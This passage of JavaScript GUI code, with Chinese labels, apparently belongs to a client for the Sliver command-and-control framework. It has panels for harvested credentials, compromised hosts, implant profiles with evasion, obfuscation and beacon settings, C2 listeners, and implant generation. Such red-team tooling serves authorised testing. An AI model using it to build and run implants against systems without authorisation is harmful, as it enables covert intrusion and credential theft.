      <div id="cred-msg" class="status-msg"></div>
    </form></div>
    <div style="overflow:auto;flex:1" id="creds-list"><div style="padding:10px;color:var(--muted)">正在加载...</div></div>`;
  openViewPanel('_creds', '凭据', content);
  const f = document.getElementById('cred-form');
  f.addEventListener('submit', async e => {
    e.preventDefault();
    const msg = document.getElementById('cred-msg'); msg.textContent = '正在保存...'; msg.className = 'status-msg';
    const err = await App().AddCred(f.username.value, f.plaintext.value, f.hash.value).then(()=>null).catch(e=>e);
    if (err) { msg.textContent = rpcErrorMessage(err, '添加凭据失败'); msg.className = 'status-msg err'; }
    else { msg.textContent = '已添加'; msg.className = 'status-msg ok'; f.reset(); refreshCredsList(); }
  });
  refreshCredsList();
}
async function refreshCredsList() {
  const el = document.getElementById('creds-list'); if (!el) return;
  const creds = await App().ListCreds().catch(() => []);
  if (!creds.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">暂无已保存的凭据。</div>'; return; }
  el.innerHTML = creds.map(c => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(c.username)}</span><span style="flex:1;font-family:var(--mono)">${esc(c.plaintext||c.hash||'')}</span>${c.cracked?'<span style="color:var(--ok)">已破解</span>':''}<button class="btn small danger" onclick="deleteCredential('${esc(c.id)}', '${esc(c.username)}')">删除</button></div>`).join('');
}
function deleteCredential(id, username) {
  return runDangerousAction({ title:'删除凭据', message:`确定永久删除“${esc(username)}”的凭据记录吗？`, okLabel:'删除', action:()=>App().DeleteCred(id), success:'凭据记录已删除', refresh:refreshCredsList });
}

// ── Hosts panel ─────────────────────────────────────────────────────────────
function openHostsPanel() {
  openViewPanel('_hosts', '主机', `<div style="overflow:auto;flex:1" id="hosts-list"><div style="padding:10px;color:var(--muted)">正在加载...</div></div>`);
  refreshHostsList();
}
async function refreshHostsList() {
  const el = document.getElementById('hosts-list'); if (!el) return;
  const hosts = await App().ListHosts().catch(() => []);
  if (!hosts.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">数据库中暂无主机。</div>'; return; }
  el.innerHTML = hosts.map(h => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(h.hostname)}</span><span style="flex:1;color:var(--muted)">${esc(h.os)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc((h.uuid||'').slice(0,8))}</span><span style="color:var(--muted)">${esc(h.firstSeen)}</span><button class="btn small danger" onclick="deleteHost('${esc(h.id)}', '${esc(h.hostname)}')">删除</button></div>`).join('');
}
function deleteHost(id, hostname) {
  return runDangerousAction({ title:'删除主机', message:`确定永久删除主机“${esc(hostname)}”吗？`, okLabel:'删除', action:()=>App().DeleteHost(id), success:'主机记录已删除', refresh:refreshHostsList });
}

function openBuildsPanel() {
  openViewPanel('_builds', '构建记录', `<div style="overflow:auto;flex:1" id="builds-list"><div style="padding:10px;color:var(--muted)">正在加载...</div></div>`);
  refreshBuildsList();
}
async function refreshBuildsList() {
  const el = document.getElementById('builds-list'); if (!el) return;
  const builds = await App().GetBuildHistory().catch(() => []);
  if (!builds?.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">暂无构建记录。</div>'; return; }
  el.innerHTML = `<table class="data-table"><thead><tr><th>名称</th><th>目标</th><th>模式 / 格式</th><th>HTTP C2</th><th>Encoder</th><th></th></tr></thead><tbody>${builds.map(b => `<tr><td><strong>${esc(b.name)}</strong></td><td>${esc(b.goos)}/${esc(b.goarch)}</td><td>${b.beacon?'Beacon':'Session'} · ${esc(b.format)}</td><td>${esc(b.httpC2Profile||'—')}</td><td>${esc((b.trafficEncoders||[]).join(', ')||'—')}</td><td><button class="btn small" onclick="buildRegen('${esc(b.name)}')">下载</button> <button class="btn small danger" onclick="deleteBuild('${esc(b.name)}')">删除</button></td></tr>`).join('')}</tbody></table>`;
}
async function deleteBuild(name) {
  if (!(await uiConfirm(`确定删除构建 ${esc(name)} 吗？`, { title: '删除构建', okLabel: '删除', danger: true }))) return;
  await App().DeleteBuild(name)
    .then(() => { toast('ok', `已删除构建 ${name}`); refreshBuildsList(); })
    .catch(e => toastRpcError(e, '删除构建失败'));
}
async function buildRegen(name) {
  const r = await App().RegenerateBuild(name).catch(error => ({ error }));
  if (r.error) toastRpcError(r.error, '重新生成构建失败');
  else toast('ok', `已保存到 ${r.path}`);
}

function profilesContent() {
  return `<div style="display:flex;justify-content:flex-end;gap:6px;margin-bottom:10px">
      <button class="btn small" onclick="pinProfiles()">📌 固定到控制台</button>
    </div>
    <div class="panel profile-editor" style="margin-bottom:12px">
      <div class="profile-editor-heading"><h3 id="prof-form-title">新建配置档案</h3><button type="button" class="btn small hidden" id="prof-cancel-edit">取消编辑</button></div>
      <form id="prof-form">
        <fieldset class="profile-section"><legend>基础与输出</legend>
          <div class="profile-grid">
            <div class="gen-field"><label>档案名称</label><input name="name" placeholder="win-mtls" required/></div>
            <div class="gen-field"><label>格式</label><select name="format"><option value="exe">可执行文件</option><option value="shared">共享库</option><option value="service">服务</option><option value="shellcode">Shellcode</option></select></div>
            <div class="gen-field"><label>操作系统</label><select name="goos"><option value="windows">Windows</option><option value="linux">Linux</option><option value="darwin">macOS</option></select></div>
            <div class="gen-field"><label>架构</label><select name="goarch"><option value="amd64">amd64</option><option value="386">386</option><option value="arm64">arm64</option></select></div>
            <div class="gen-field"><label>模板名称</label><input name="templateName" placeholder="sliver"/></div>
          </div>
          <div class="profile-checks">
            <label class="check-label"><input type="checkbox" name="debug"/> 调试模式</label>
            <label class="check-label"><input type="checkbox" name="evasion"/> 启用规避功能</label>
            <label class="check-label"><input type="checkbox" name="obfuscateSymbols" checked/> 混淆符号</label>
            <label class="check-label"><input type="checkbox" name="netGo"/> 强制 NetGo</label>
            <label class="check-label"><input type="checkbox" name="runAtLoad" id="prof-run-at-load"/> 共享库加载时运行</label>
            <label class="check-label"><input type="checkbox" name="beacon" id="prof-beacon"/> 信标模式</label>
          </div>
          <div class="profile-grid hidden" id="prof-beacon-opts">
            <div class="gen-field"><label>信标间隔（秒）</label><input name="interval" type="number" min="1" value="60"/></div>
            <div class="gen-field"><label>信标抖动（秒）</label><input name="jitter" type="number" min="0" value="30"/></div>
          </div>
        </fieldset>
        <fieldset class="profile-section"><legend>C2 与连接</legend>
          <div class="gen-field"><label>多个 C2（每行：优先级 | URL | 可选协议参数）</label><textarea name="c2Entries" rows="6" placeholder="1 | mtls://10.0.0.5:8888&#10;2 | https://example.com:443&#10;3 | dns://c2.example.com&#10;4 | wg://10.0.0.5:51820&#10;5 | tcp-pivot://pivot:9898&#10;6 | namedpipe://host/pipe/sliver" required></textarea><span class="field-note">支持 mTLS、HTTP/HTTPS、DNS、WireGuard、TCP Pivot 与 Named Pipe Pivot；协议参数写在第三列。</span></div>
          <div class="profile-grid">
            <div class="gen-field"><label>连接策略</label><select name="connectionStrategy"><option value="">默认</option><option value="s">顺序</option><option value="r">随机</option><option value="rd">随机域名</option></select></div>
            <div class="gen-field"><label>重连间隔（秒）</label><input name="reconnectInterval" type="number" min="0" value="60"/></div>
            <div class="gen-field"><label>最大连接错误</label><input name="maxConnectionErrors" type="number" min="0" value="1000"/></div>
            <div class="gen-field"><label>长轮询超时（秒）</label><input name="pollTimeout" type="number" min="0" value="360"/></div>
            <div class="gen-field http-c2-field"><label>HTTP C2 档案</label><select name="httpC2Profile" id="prof-http-c2"><option value="">正在读取 Teamserver...</option></select><span id="prof-http-c2-note" class="field-note">仅在 C2 包含 HTTP/HTTPS 时启用。</span></div>
            <div class="gen-field"><label>流量编码器（逗号分隔）</label><input name="trafficEncoders" placeholder="gzip"/></div>
          </div>
          <div class="http-c2-actions" id="prof-http-c2-actions">
            <button type="button" class="btn small" data-http-c2-action="view">查看</button><button type="button" class="btn small" data-http-c2-action="new">新建</button><button type="button" class="btn small" data-http-c2-action="import">导入</button><button type="button" class="btn small" data-http-c2-action="edit">编辑</button><button type="button" class="btn small" data-http-c2-action="validate">验证</button><button type="button" class="btn small" data-http-c2-action="refresh">刷新</button>
          </div>
          <div class="gen-field"><label>Canary 域名（逗号或换行分隔）</label><textarea name="canaryDomains" rows="2" placeholder="canary.example.com"></textarea></div>
        </fieldset>
        <fieldset class="profile-section"><legend>执行限制</legend>
          <div class="profile-checks"><label class="check-label"><input type="checkbox" name="limitDomainJoined"/> 仅域成员计算机</label></div>
          <div class="profile-grid">
            <div class="gen-field"><label>最晚执行时间</label><input name="limitDatetime" placeholder="2027-01-01T00:00:00Z"/></div>
            <div class="gen-field"><label>主机名</label><input name="limitHostname"/></div>
            <div class="gen-field"><label>用户名</label><input name="limitUsername"/></div>
            <div class="gen-field"><label>必须存在的文件</label><input name="limitFileExists"/></div>
            <div class="gen-field"><label>区域设置</label><input name="limitLocale" placeholder="en-US"/></div>
          </div>
        </fieldset>
        <div class="gen-row"><button type="submit" class="btn accent" id="prof-submit" style="margin-left:auto">保存配置档案</button></div>
        <div id="prof-msg" class="status-msg"></div>
      </form>
    </div>
    <div style="overflow:auto;flex:1" data-profiles-list><div style="padding:10px;color:var(--muted)">正在加载...</div></div>`;
}
function openProfilesPanel() {
  openViewPanel('_profiles', '植入体配置档案', profilesContent());
  wireProfileForm();
  refreshProfilesList();
}
function parseProfileC2(value) {
  return String(value || '').split(/\r?\n/).map((line, index) => {
    const parts = line.split('|').map(part => part.trim());
    if (!parts.join('')) return null;
    const hasPriority = /^\d+$/.test(parts[0]);
    return { priority: hasPriority ? parseInt(parts.shift(), 10) : index + 1, url: parts.shift() || '', options: parts.join('|').trim() };
  }).filter(item => item?.url);
}
function wireProfileForm() {
  const f = document.getElementById('prof-form'); if (!f) return;
  const httpSelect = f.httpC2Profile, httpNote = document.getElementById('prof-http-c2-note');
  const httpActions = [...document.querySelectorAll('[data-http-c2-action]')];
  const hasHTTPTransport = () => parseProfileC2(f.c2Entries.value).some(entry => /^https?:\/\//i.test(entry.url));
  const refreshHTTPProfiles = async preferred => {
    const current = preferred || httpSelect.value;
    httpSelect.innerHTML = '<option value="">正在读取 Teamserver...</option>';
    const result = await App().ListHTTPC2Profiles().then(profiles => ({ profiles })).catch(error => ({ error }));
    if (result.error) {
      httpSelect.innerHTML = '<option value="">读取失败</option>'; httpNote.textContent = rpcErrorMessage(result.error, '无法读取 HTTP C2 档案');
      updateHTTPState(); return;
    }
    httpSelect.innerHTML = '<option value="">自动选择</option>' + (result.profiles || []).map(profile => `<option value="${esc(profile.name)}">${esc(profile.name)}</option>`).join('');
    if ([...httpSelect.options].some(option => option.value === current)) httpSelect.value = current;
    updateHTTPState();
  };
  const updateHTTPState = () => {
    const enabled = hasHTTPTransport();
    httpSelect.disabled = !enabled;
    httpNote.textContent = enabled ? '来自当前 Teamserver；留空时自动选择。' : '当前 C2 不含 HTTP/HTTPS，此字段不会提交。';
    httpActions.forEach(button => {
      const action = button.dataset.httpC2Action;
      button.disabled = ['view','edit','validate'].includes(action) && !httpSelect.value;
    });
  };
  f.c2Entries.addEventListener('input', updateHTTPState);
  httpSelect.addEventListener('change', updateHTTPState);
  document.getElementById('prof-http-c2-actions')?.addEventListener('click', async event => {
    const button = event.target.closest('[data-http-c2-action]'); if (!button || button.disabled) return;
    const action = button.dataset.httpC2Action, selected = httpSelect.value;
    if (action === 'refresh') return refreshHTTPProfiles();
    if (action === 'new') return openC2Editor('', '', refreshHTTPProfiles);
    if (action === 'import') {
      const imported = await App().ImportHTTPC2ProfileFile().catch(error => ({ error }));
      if (!imported || imported.error) { if (imported?.error) toastRpcError(imported.error, '导入 HTTP C2 档案失败'); return; }
      return openC2Editor('', imported, refreshHTTPProfiles);
    }
    if (!selected) return toast('info', '请先选择 HTTP C2 档案');
    if (action === 'view') {
      const json = await App().GetHTTPC2Profile(selected).catch(error => ({ error }));
      if (json?.error) return toastRpcError(json.error, '读取 HTTP C2 档案失败');
      openViewPanel('_c2view', `HTTP C2 档案 - ${selected}`, `<pre class="c2-profile-preview">${esc(json)}</pre>`); return;
    }
    if (action === 'edit') return openC2Editor(selected, '', refreshHTTPProfiles);
    if (action === 'validate') {
      const json = await App().GetHTTPC2Profile(selected).catch(error => ({ error }));
      if (json?.error) return toastRpcError(json.error, '读取 HTTP C2 档案失败');
      const result = await App().ValidateHTTPC2Profile(json).catch(error => ({ error }));
      if (result.error) toastRpcError(result.error, 'HTTP C2 档案验证失败'); else toast('ok', `${result.name} 已通过 Sliver 模型校验`);
    }
  });
  document.getElementById('prof-beacon')?.addEventListener('change', function() {
    document.getElementById('prof-beacon-opts').classList.toggle('hidden', !this.checked);
  });
  f.format.addEventListener('change', () => { f.runAtLoad.disabled = f.format.value !== 'shared'; if (f.runAtLoad.disabled) f.runAtLoad.checked = false; });
  f.debug.addEventListener('change', () => { if (f.debug.checked) f.obfuscateSymbols.checked = false; });
  document.getElementById('prof-cancel-edit')?.addEventListener('click', resetProfileForm);
  f.addEventListener('submit', async e => {
    e.preventDefault();
    const c2 = parseProfileC2(f.c2Entries.value);
    const splitList = value => String(value || '').split(/[\r\n,]+/).map(v => v.trim()).filter(Boolean);
    const req = { name:f.name.value.trim(), goos:f.goos.value, goarch:f.goarch.value, format:f.format.value, c2, c2Url:c2[0]?.url||'', debug:f.debug.checked, evasion:f.evasion.checked, obfuscateSymbols:f.obfuscateSymbols.checked, netGo:f.netGo.checked, runAtLoad:f.runAtLoad.checked, beacon:f.beacon.checked, interval:parseInt(f.interval?.value)||60, jitter:parseInt(f.jitter?.value)||0, connectionStrategy:f.connectionStrategy.value, reconnectInterval:parseInt(f.reconnectInterval.value)||0, maxConnectionErrors:parseInt(f.maxConnectionErrors.value)||0, pollTimeout:parseInt(f.pollTimeout.value)||0, httpC2Profile:hasHTTPTransport()?f.httpC2Profile.value:'', trafficEncoders:splitList(f.trafficEncoders.value), templateName:f.templateName.value.trim(), canaryDomains:splitList(f.canaryDomains.value), limitDomainJoined:f.limitDomainJoined.checked, limitDatetime:f.limitDatetime.value.trim(), limitHostname:f.limitHostname.value.trim(), limitUsername:f.limitUsername.value.trim(), limitFileExists:f.limitFileExists.value.trim(), limitLocale:f.limitLocale.value.trim() };
    const msg = document.getElementById('prof-msg');
    if (!c2.length) { msg.textContent = '请至少填写一条有效的 C2 URL'; msg.className = 'status-msg err'; return; }
    msg.textContent = '正在保存...'; msg.className = 'status-msg';
    const r = await App().SaveImplantProfile(req).then(() => null).catch(e => e);
    if (r) { msg.textContent = rpcErrorMessage(r, '保存配置档案失败'); msg.className = 'status-msg err'; }
    else { msg.textContent = f.dataset.editing ? '配置档案已更新' : '配置档案已保存'; msg.className = 'status-msg ok'; resetProfileForm(); updateHTTPState(); refreshProfilesList(); }
  });
  updateHTTPState();
  refreshHTTPProfiles();
}
let implantProfilesCache = [];
function resetProfileForm() {
  const f = document.getElementById('prof-form'); if (!f) return;
  f.reset(); delete f.dataset.editing; f.name.readOnly = false; f.obfuscateSymbols.checked = true;
  document.getElementById('prof-form-title').textContent = '新建配置档案';
  document.getElementById('prof-submit').textContent = '保存配置档案';
  document.getElementById('prof-cancel-edit').classList.add('hidden');
  document.getElementById('prof-beacon-opts').classList.add('hidden');
  f.runAtLoad.disabled = f.format.value !== 'shared';
}
function editImplantProfile(name) {
  const p = implantProfilesCache.find(profile => profile.name === name), f = document.getElementById('prof-form');
  if (!p || !f) return toast('err', '未找到要编辑的配置档案');
  f.dataset.editing = name; f.name.value = p.name || ''; f.name.readOnly = true;
  ['goos','goarch','format','connectionStrategy','httpC2Profile'].forEach(key => { if (p[key] != null && f[key]) f[key].value = p[key]; });
  ['templateName','limitDatetime','limitHostname','limitUsername','limitFileExists','limitLocale'].forEach(key => { if (f[key]) f[key].value = p[key] || ''; });
  ['interval','jitter','reconnectInterval','maxConnectionErrors','pollTimeout'].forEach(key => { if (f[key]) f[key].value = p[key] ?? 0; });
  ['debug','evasion','obfuscateSymbols','netGo','runAtLoad','beacon','limitDomainJoined'].forEach(key => { if (f[key]) f[key].checked = !!p[key]; });
  f.c2Entries.value = (p.c2 || []).map((entry, index) => `${entry.priority || index + 1} | ${entry.url}${entry.options ? ` | ${entry.options}` : ''}`).join('\n') || p.c2Url || '';
  f.trafficEncoders.value = (p.trafficEncoders || []).join(', '); f.canaryDomains.value = (p.canaryDomains || []).join(', ');
  document.getElementById('prof-form-title').textContent = `编辑配置档案：${p.name}`;
  document.getElementById('prof-submit').textContent = '保存修改'; document.getElementById('prof-cancel-edit').classList.remove('hidden');
  document.getElementById('prof-beacon-opts').classList.toggle('hidden', !p.beacon);
  f.runAtLoad.disabled = f.format.value !== 'shared'; f.c2Entries.dispatchEvent(new Event('input')); f.httpC2Profile.dispatchEvent(new Event('change'));
  document.getElementById('modal-body')?.scrollTo({top:0,behavior:'smooth'});
}
async function refreshProfilesList() {
  const targets = document.querySelectorAll('[data-profiles-list]');
  if (!targets.length) return;
  const profs = await App().ListImplantProfiles().catch(() => []);
  implantProfilesCache = profs || [];
  const html = !profs?.length
    ? '<div style="padding:10px;color:var(--muted)">暂无已保存的配置档案，请在上方创建。</div>'
    : profs.map(p => `<div class="profile-list-row"><span><strong>${esc(p.name)}</strong><small>${p.beacon?'信标':'会话'} · ${esc(p.goos)}/${esc(p.goarch)} · ${esc(p.format)} · ${(p.c2||[]).length||1} 条 C2</small></span><span class="profile-tags">${p.evasion?'<em>规避</em>':''}${p.obfuscateSymbols?'<em>符号混淆</em>':''}${p.limitDomainJoined||p.limitHostname||p.limitUsername?'<em>执行限制</em>':''}</span><button class="btn small" onclick="editImplantProfile(decodeURIComponent('${encodeURIComponent(p.name)}'))">编辑</button><button class="btn small" onclick='genFromProfile(${JSON.stringify(p)})'>生成</button><button class="btn small danger" onclick="deleteImplantProfile(decodeURIComponent('${encodeURIComponent(p.name)}'))">删除</button></div>`).join('');
  targets.forEach(el => el.innerHTML = html);
}
function deleteImplantProfile(name) {
  return runDangerousAction({ title:'删除配置档案', message:`确定永久删除“${esc(name)}”吗？`, okLabel:'删除', action:()=>App().DeleteImplantProfile(name), success:'配置档案已删除', refresh:refreshProfilesList });
}
// pinProfiles docks a live profiles list into the bottom console.
function pinProfiles() {
  hideModal();
  const id = '_profiles_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>📦 配置档案</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1" data-profiles-list></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  refreshProfilesList();
}
// genFromProfile pre-fills the Generate form from a saved profile.
function genFromProfile(p) {
  closeTab('_generate');
  openGeneratePanel();
  setTimeout(() => {
    const f = document.getElementById('gen-form'); if (!f) return;
    f._profileConfig = p;
    if (p.goos) f.goos.value = p.goos;
    if (p.goarch) f.goarch.value = p.goarch;
    if (p.format) f.format.value = p.format;
    if (p.c2Url) f.c2Url.value = p.c2Url;
    f.debug.checked = !!p.debug;
    if (p.beacon) {
      f.beacon.checked = true;
      document.getElementById('gbeacon-opts').style.display = 'flex';
      if (f.interval) f.interval.value = p.interval || 60;
      if (f.jitter) f.jitter.value = p.jitter || 0;
    }
  }, 30);
}

function openListenersPanel() {
  const content = `<div class="listener-layout">
    <div class="panel"><h3>启动监听器</h3>
      <div class="field-row"><label>类型</label><select id="ls-type"><option value="mtls">mTLS</option><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option><option value="wg">WireGuard</option></select></div>
      <div id="ls-fields"></div>
      <button class="btn accent" id="ls-start" style="width:100%;margin-top:6px">启动</button>
      <div id="ls-msg" class="status-msg"></div>
    </div>
    <div class="panel"><h3>活动监听器</h3><div id="ls-list" class="table-wrap"></div></div>
  </div>`;
  openViewPanel('_listeners', '监听器', content);
  setTimeout(wireListeners, 0);
}
async function wireListeners() {
  const startBtn = document.getElementById('ls-start'); if (!startBtn) return;
  const typeEl = document.getElementById('ls-type'), fields = document.getElementById('ls-fields');
  const renderFields = () => {
    const type = typeEl.value, defaults={mtls:8888,http:80,https:443,dns:53,wg:51820};
    if (type==='dns') fields.innerHTML=`<div class="field-row"><label>域名</label><input id="ls-domains" placeholder="c2.example.com, alt.example.com"/></div><div class="field-row"><label>绑定主机</label><input id="ls-host" value="0.0.0.0"/></div><div class="field-row"><label>端口</label><input id="ls-port" type="number" value="53"/></div><label class="check-label"><input id="ls-otp" type="checkbox"/> 强制 OTP</label><label class="check-label"><input id="ls-canaries" type="checkbox"/> 启用 Canary</label>`;
    else if(type==='wg') fields.innerHTML=`<div class="field-row"><label>绑定主机</label><input id="ls-host" value="0.0.0.0"/></div><div class="field-row"><label>UDP 端口</label><input id="ls-port" type="number" value="51820"/></div><div class="field-row"><label>隧道 IP</label><input id="ls-tun" value="100.64.0.1"/></div><div class="field-row"><label>TCP 通信端口</label><input id="ls-nport" type="number" value="8888"/></div><div class="field-row"><label>密钥交换端口</label><input id="ls-keyport" type="number" value="1337"/></div>`;
    else fields.innerHTML=`<div class="field-row"><label>绑定主机</label><input id="ls-host" value="0.0.0.0"/></div><div class="field-row"><label>端口</label><input id="ls-port" type="number" value="${defaults[type]}"/></div>${type==='http'||type==='https'?`<div class="field-row"><label>公开域名</label><input id="ls-domain" placeholder="可选"/></div><div class="field-row"><label>网站</label><input id="ls-website" placeholder="可选"/></div><div class="field-row"><label>长轮询超时 / 抖动</label><div class="inline-pair"><input id="ls-poll" type="number" min="0" value="0"/><input id="ls-jitter" type="number" min="0" value="0"/></div></div><label class="check-label"><input id="ls-otp" type="checkbox"/> 强制 OTP</label>${type==='https'?'<label class="check-label"><input id="ls-acme" type="checkbox"/> 使用 ACME</label><label class="check-label"><input id="ls-jarm" type="checkbox"/> 随机化 JARM</label>':''}`:''}`;
  };
  typeEl.addEventListener('change', renderFields); renderFields();
  startBtn.addEventListener('click', async () => {
    const type = typeEl.value;
    const host = document.getElementById('ls-host').value.trim()||'0.0.0.0';
    const port = parseInt(document.getElementById('ls-port').value)||0;
    const msg = document.getElementById('ls-msg');
    msg.textContent = '正在启动...'; msg.className = 'status-msg';
    try {
      if (type==='mtls') await App().StartMTLSListener({host,port});
      else if (type==='https'||type==='http') await App().StartHTTPListener({host,port,secure:type==='https',domain:document.getElementById('ls-domain').value.trim(),website:document.getElementById('ls-website').value.trim(),acme:!!document.getElementById('ls-acme')?.checked,enforceOtp:document.getElementById('ls-otp').checked,longPollTimeout:parseInt(document.getElementById('ls-poll').value)||0,longPollJitter:parseInt(document.getElementById('ls-jitter').value)||0,randomizeJarm:!!document.getElementById('ls-jarm')?.checked});
      else if (type==='dns') await App().StartDNSListener({domains:document.getElementById('ls-domains').value.split(',').map(v=>v.trim()).filter(Boolean),host,port,canaries:document.getElementById('ls-canaries').checked,enforceOtp:document.getElementById('ls-otp').checked});
      else if(type==='wg') await App().StartWGListener({host,port,tunIp:document.getElementById('ls-tun').value.trim(),nPort:parseInt(document.getElementById('ls-nport').value)||0,keyPort:parseInt(document.getElementById('ls-keyport').value)||0});
      msg.textContent = `${type.toUpperCase()} 已启动`; msg.className = 'status-msg ok';
    } catch(e) { msg.textContent = rpcErrorMessage(e, '启动监听器失败'); msg.className = 'status-msg err'; }
    refreshListenerList();
  });
  refreshListenerList();
}
async function refreshListenerList() {
  const el = document.getElementById('ls-list'); if (!el) return;
  const jobs = await App().ListJobs().catch(() => []);
  if (!jobs?.length) { el.innerHTML = '<div style="color:var(--muted);font-size:12px">暂无活动监听器</div>'; return; }
  el.innerHTML = `<table class="data-table"><thead><tr><th>状态</th><th>名称 / 协议</th><th>地址</th><th>Job</th><th>C2 档案</th><th></th></tr></thead><tbody>${jobs.map(j => `<tr><td><span class="status-dot online"></span>运行中</td><td><strong>${esc(j.name)}</strong> · ${esc(j.protocol)}</td><td>${esc(j.address||(':'+j.port))}</td><td>#${j.id}</td><td>${esc(j.profileName||'—')}</td><td><button class="btn small danger" onclick="stopListener(${j.id}, '${esc(j.name)}')">终止</button></td></tr>`).join('')}</tbody></table>`;
}
function stopListener(id, name) {
  return runDangerousAction({ title:'终止监听器', message:`确定终止监听器“${esc(name)}”（Job ${id}）吗？`, okLabel:'终止', action:()=>App().KillJob(id), success:'监听器已终止', refresh:refreshListenerList });
}

function openGeneratePanel() {
  const content = `<form id="gen-form" class="gen-form">
    <div class="studio-heading"><div><strong>Implant Studio</strong><span>生成前先校验 Teamserver 编译器、Listener 与依赖</span></div><button type="button" class="btn small" id="gen-builds">构建历史</button></div>
    <div class="gen-row">
      <div class="gen-field"><label>配置档案</label><select id="gen-profile"><option value="">自定义配置</option></select></div>
      <div class="gen-field"><label>名称（可选）</label><input name="name" placeholder="自动生成"/></div>
      <div class="gen-field"><label>格式</label><select name="format"><option value="exe">可执行文件</option><option value="shared">共享库</option><option value="service">服务</option><option value="shellcode">Shellcode</option></select></div>
    </div>
    <div class="gen-row">
      <div class="gen-field"><label>操作系统</label><select name="goos"><option value="windows">Windows</option><option value="linux">Linux</option><option value="darwin">macOS</option></select></div>
      <div class="gen-field"><label>架构</label><select name="goarch"><option value="amd64">amd64</option><option value="386">386</option><option value="arm64">arm64</option></select></div>
    </div>
    <div class="gen-row"><div class="gen-field" style="flex:2"><label>使用监听器</label><select id="gen-listener"><option value="">- 选择活动监听器 -</option></select></div></div>
    <div class="gen-row"><div class="gen-field" style="flex:2"><label>C2 URL</label><input name="c2Url" placeholder="mtls://ip:port or https://ip:port" required/></div></div>
    <div class="gen-row"><div class="gen-field"><label>HTTP C2 档案</label><select name="httpC2Profile"><option value="">自动选择</option></select></div><div class="gen-field"><label>连接策略</label><select name="connectionStrategy"><option value="">默认</option><option value="s">顺序</option><option value="r">随机</option><option value="rd">随机域名</option></select></div></div>
    <div class="gen-row"><div class="gen-field"><label>流量编码器</label><select name="trafficEncoder"><option value="">不使用</option></select></div><div class="gen-field"><label>重连间隔（秒）</label><input name="reconnectInterval" type="number" min="0" value="60"/></div><div class="gen-field"><label>最大连接错误</label><input name="maxConnectionErrors" type="number" min="0" value="1000"/></div></div>
    <div class="gen-row">
      <label class="check-label"><input type="checkbox" name="debug"/> 调试模式</label>
      <label class="check-label"><input type="checkbox" name="beacon" id="gbeacon"/> 信标模式</label>
    </div>
    <div class="gen-row" id="gbeacon-opts" style="display:none">
      <div class="gen-field"><label>间隔（秒）</label><input name="interval" type="number" value="60"/></div>
      <div class="gen-field"><label>抖动（秒）</label><input name="jitter" type="number" value="30"/></div>
    </div>
    <div class="gen-row" id="gen-metadata-row"><div class="gen-field"><label>Windows PE 元数据参考文件（可选）</label><div class="file-picker"><input name="metadataPath" readonly placeholder="未选择"/><button type="button" class="btn" id="gen-pick-metadata">选择</button><button type="button" class="icon-btn" id="gen-clear-metadata" title="清除">×</button></div><span class="field-note">仅支持 Windows PE 输出，任务和审计摘要只显示文件名。</span></div></div>
    <div class="studio-actions"><button type="button" class="btn" id="gen-preflight">执行预检</button><button type="submit" class="btn accent" id="gen-submit" disabled>生成</button></div>
    <div id="gen-preflight-result" class="preflight-box"><span>修改配置后执行预检。</span></div>
    <div id="gen-status" class="gen-status" style="display:none"><div class="spinner"></div><span>正在构建...</span></div>
    <div id="gen-result" class="result-box"></div>
  </form>`;
  openViewPanel('_generate', '生成植入体', content);
  setTimeout(async () => {
    document.getElementById('gbeacon')?.addEventListener('change', function() {
      document.getElementById('gbeacon-opts').style.display = this.checked ? 'flex' : 'none';
    });
    document.getElementById('gen-builds').addEventListener('click', openBuildsPanel);
    const f = document.getElementById('gen-form'), submit = document.getElementById('gen-submit');
    f._profileConfig = {};
    const readReq = () => {
      const profileC2 = f._profileConfig.c2 || [];
      const c2 = profileC2.length
        ? profileC2.map((entry, index) => index === 0 ? {...entry, url:f.c2Url.value} : entry)
        : [];
      return {...f._profileConfig,name:f.name.value,goos:f.goos.value,goarch:f.goarch.value,format:f.format.value,c2,c2Url:f.c2Url.value,debug:f.debug.checked,beacon:f.beacon.checked,interval:parseInt(f.interval?.value)||60,jitter:parseInt(f.jitter?.value)||0,httpC2Profile:hasHTTPTransport()?f.httpC2Profile.value:'',connectionStrategy:f.connectionStrategy.value,reconnectInterval:parseInt(f.reconnectInterval.value)||0,maxConnectionErrors:parseInt(f.maxConnectionErrors.value)||0,pollTimeout:f._profileConfig.pollTimeout||0,trafficEncoders:f.trafficEncoder.value?[f.trafficEncoder.value]:(f._profileConfig.trafficEncoders||[]),metadataPath:f.metadataPath.value};
    };
    const hasHTTPTransport = () => /^https?:\/\//i.test(f.c2Url.value.trim());
    const updateHTTPState = () => { f.httpC2Profile.disabled=!hasHTTPTransport(); };
    const invalidate = () => { updateHTTPState(); submit.disabled=true; document.getElementById('gen-preflight-result').innerHTML='<span>配置已变化，请重新执行预检。</span>'; };
    f.addEventListener('input', invalidate); f.addEventListener('change', invalidate);
    document.getElementById('gen-pick-metadata').addEventListener('click', async()=>{ const path=await App().PickPEMetadataFile().catch(()=> ''); if(path){f.metadataPath.value=path;invalidate();} });
    document.getElementById('gen-clear-metadata').addEventListener('click',()=>{f.metadataPath.value='';invalidate();});
    const [profiles,httpProfiles,encoders] = await Promise.all([App().ListImplantProfiles().catch(()=>[]),App().ListC2Profiles().catch(()=>[]),App().ListTrafficEncoders().catch(()=>[])]);
